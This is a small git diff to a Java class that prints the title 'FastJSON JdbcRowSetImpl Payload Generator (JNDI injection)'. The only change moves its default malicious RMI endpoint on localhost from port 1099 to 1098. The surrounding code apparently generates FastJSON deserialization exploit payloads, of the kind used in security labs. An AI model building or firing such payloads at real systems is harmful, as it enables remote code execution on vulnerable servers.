@@ -11,7 +11,7 @@ public class Client0 {
         System.out.println("=== FastJSON JdbcRowSetImpl Payload 生成器（JNDI注入） ===\n");
         
         // 默认 RMI 地址（如果 1099 端口被占用，可以使用其他端口，如 1098）
-        String rmiUrl = "rmi://127.0.0.1:1099/exp";
+        String rmiUrl = "rmi://127.0.0.1:1098/exp";
         
         // 如果提供了参数，使用参数作为 RMI 地址
         if (args.length > 0) {
